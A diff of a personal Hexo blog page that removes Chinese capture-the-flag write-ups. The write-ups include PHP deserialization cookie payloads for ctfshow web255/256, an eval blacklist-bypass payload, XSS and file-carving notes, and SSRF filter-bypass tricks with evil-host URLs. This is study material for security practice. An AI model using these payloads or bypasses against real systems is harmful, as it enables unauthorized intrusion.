@@ -16,7 +16,7 @@
       <title> n0rt6&#39;s bolg</title>
   <meta name="generator" content="hexo-theme-ayer">
       
-      <link rel="shortcut icon" href="/favicon.ico" />
+      <link rel="shortcut icon" href="/favicon.jpg" />
        
 <link rel="stylesheet" href="/dist/main.css">
 
@@ -57,7 +57,7 @@
 <section class="cover">
     
       
-      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
+      <a class="forkMe" href="https://github.com/3143047748/3143047748.github.io"
         target="_blank"><img width="149" height="149" src="/images/forkme.png"
           class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
     
@@ -92,7 +92,7 @@
   <script>
     try {
       var typed = new Typed("#subtitle", {
-        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
+        strings: ['努力吧，骚年！！', '努力成为一名合格的hacker！', '想要的都拥有，得不到的都释怀'],
         startDelay: 0,
         typeSpeed: 200,
         loop: true,
@@ -106,22 +106,6 @@
   
 <div id="main">
   <section class="outer">
-  
-  <ul class="ads">
-    
-        <li>
-            <a target="_blank" rel="noopener" href="https://curl.qcloud.com/kvO7hb43">
-                <img src="https://pic.imgdb.cn/item/62174b452ab3f51d912a5ccc.jpg" width="300" alt="云服务器限时秒杀">
-            </a>
-        </li>
-    
-        <li>
-            <a target="_blank" rel="noopener" href="https://www.vultr.com/?ref=8630075">
-                <img src="https://pic.imgdb.cn/item/62174b452ab3f51d912a5cd7.png" width="300" alt="vultr优惠vps">
-            </a>
-        </li>
-    
-</ul>
   
   
   
@@ -200,19 +184,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我平常写博客就是先在csdn上完成后再复制粘贴到hexo博客中，这样容易引入图片，今天遇到一个问题就是在部署后发现hexo博客无法显示图片了。</p>
-<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>方法其实很简单，只需要文章的头部如下图所示位置添加这一句话就可以完美解决问题</p>
-<p><img src="https://img-blog.csdnimg.cn/5616d0a30e614287881b0ae1a13cb8ff.png" alt="2"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -256,149 +228,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-12-02 17:44:47
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-12-02 19:29:02
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>首先定义一个类<strong>ctfShowUser</strong>，创建公共变量<code>$username，$password，$isVip</code>。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>将cookie反序列化，cookie用user传入。总体思路也就是GET传入username和password然后将cookie进行反序列化。由于<code>public $isVip=false;public function checkVip()&#123;        return $this-&gt;isVip;    &#125;</code>，所以要将checkvip回显为真。并且获得将cookie的user序列化后的代码。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
-	<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行结果为<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br><img src="https://img-blog.csdnimg.cn/232c87cffaf54618987f47609eea9756.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/8ad56eb636804a2d8bb55c4f918fe918.png" alt="2">得到flag。</p>
-<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-12-02 17:44:47
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-12-02 19:29:02
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
-              <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>遇上题的区别就是增加了一个条件<code>if($this-&gt;username!==$this-&gt;password)</code>就是username不等于password。写代码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
-		<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
-		<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'dfgh'</span><span class="token punctuation">;</span>
-		<span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>运行后得到<code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22dfgh%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D</code><br>其余与上题一样。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -444,67 +274,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="这是一道比较简单的web题目"><a href="#这是一道比较简单的web题目" class="headerlink" title="这是一道比较简单的web题目"></a>这是一道比较简单的web题目</h2><p><img src="https://img-blog.csdnimg.cn/f5b19dbc39a34b3e9bf5650b3795ae5e.png" alt="1"><br>将三张照片都保存下来，然后拼图。发现第一张反了，将第一张倒置过来拼图然后扫码<br><img src="https://img-blog.csdnimg.cn/755c10249c564270ab3d4f00f01c7b07.png" alt="2"><br>扫过后得到<br><img src="https://img-blog.csdnimg.cn/6938f6a4f37345738d5975c6a384ccc4.png" alt="3"><br>那就访问&#x2F;vbnp.php<br>得到</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//��������</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>将<strong>t</strong>  ,<strong>r</strong>   ,<strong>n</strong>,  <strong>‘</strong>  ,<strong>“</strong>,  <strong>&#96;</strong>,  <strong>[</strong>,  <strong>]</strong>,  <strong>$</strong>,  *<em>*</em>,  <strong>^</strong>过滤了</p>
-<blockquote>
-<p>var_dump() 函数用于输出变量的相关信息。<br>var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>Scandir()：列出 参数目录 中的文件和目录</p>
-</blockquote>
-<p>**加载?num&#x3D;var_dump(scandir(chr(47)))**也就是var_dump(“&#x2F;“)，就可以得到flag。</p>
-<h2 id="黑心的网站"><a href="#黑心的网站" class="headerlink" title="黑心的网站"></a>黑心的网站</h2><p><img src="https://img-blog.csdnimg.cn/53061123fbfa4e4983c58136f462d8f0.png" alt="1"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/3e31a950eef94314959c25f74b06896c.png" alt="25"><br>dirsearch扫一下得到备份文件<br><img src="https://img-blog.csdnimg.cn/5c19ee13d99a4795b1a6fbc952613dec.png" alt="3"><br>内容为：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//error_reporting(0);</span>
-
-<span class="token comment">//设置靶机所在路径</span>
-<span class="token variable">$site_root</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/NFPC"</span><span class="token punctuation">;</span>
-
-<span class="token comment">//设置上传目录</span>
-<span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../upload/"</span><span class="token punctuation">;</span>
-
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/f6421facbd144e92b789f7a2415345d8.png" alt="5"><br>找到<br><img src="https://img-blog.csdnimg.cn/af5a997fc70e43bf804179d0905dd5bc.png" alt="6"><br>发现xss漏洞<br><img src="https://img-blog.csdnimg.cn/476ec9c4fb6d4fd6977334c8f528999e.png" alt="7"><br>发现script被过滤，<br><img src="https://img-blog.csdnimg.cn/d5a6de988010492882ada878665ac939.png" alt="2"><strong>&lt;&gt;<strong>被转义，那就闭合<br><img src="https://img-blog.csdnimg.cn/6e25dae7e7734c799d07bd78fc542e68.png" alt="6"><br>成功！！！</strong>WAxiangxiangzuichaofan&#x2F;flag</strong><br>得到一个文件，看到文件尾有特征，用foremost分离文件，<br><img src="https://img-blog.csdnimg.cn/6d40bf494d20431aa41b44c8025e13df.png" alt="9">    </p>
-<blockquote>
-<pre><code>-V-显示版权信息并退出
--t-指定文件类型。（-t jpeg，pdf…）
--d-启用间接块检测（对于UNIX文件系统）
--i-指定输入文件（默认为stdin）
--a-写入所有标头，不执行错误检测（损坏的文件）
--w-仅写入审核文件，不将任何检测到的文件写入磁盘
--o-设置输出目录（默认为输出）
--c-设置要使用的配置文件（默认为forest.conf）
--q-启用快速模式。在512字节边界上执行搜索。
--Q-启用静音模式。抑制输出消息。
--v-冗余模式。将所有消息记录到屏幕。
-</code></pre>
-</blockquote>
-<p>得到分离的文件，有flag。<br><img src="https://img-blog.csdnimg.cn/09154bd7f7ab4779b08279e726f80343.png" alt="12"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -550,199 +320,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>当<strong>127.0.0.1</strong>被过滤时，可以使用<strong>127.1</strong> <strong>0</strong> <strong>0.0.0.0</strong>  <strong>sudo.cc</strong> <strong>017700000001</strong> <strong>2130706433</strong> 等等。如果某些字符串被过滤了，尝试对字符串进行两次url编码。</p>
-<h3 id="SSRF具有基于白名单的输入过滤器"><a href="#SSRF具有基于白名单的输入过滤器" class="headerlink" title="SSRF具有基于白名单的输入过滤器"></a>SSRF具有基于白名单的输入过滤器</h3><p>某些应用程序只允许与允许值的白名单匹配、以其开头或包含其的输入。在这种情况下，有时可以利用URL解析中的不一致性来绕过过滤器。</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">URL</span>规范包含许多在实现对<span class="token constant">URL</span>的即席解析和验证时容易被忽略的特性：
-
-<span class="token number">1</span>、可以使用@字符在主机名之前的 <span class="token constant">URL</span> 中嵌入凭据。 例如：
-    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>预期主机<span class="token punctuation">)</span>@evil<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>恶意主机<span class="token punctuation">)</span>
-
-<span class="token number">2</span>、可以使用 # 字符来表示 <span class="token constant">URL</span> 片段。例如：
-    https：<span class="token comment">//evil-host(恶意主机)#expected-host(预期主机)</span>
-
-<span class="token number">3</span>、可以利用<span class="token constant">DNS</span>命名层次结构将所需的输入放入您控制的完全限定<span class="token constant">DNS</span>名称中。例如：
-    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span>host<span class="token punctuation">.</span>evil<span class="token operator">-</span>host
-
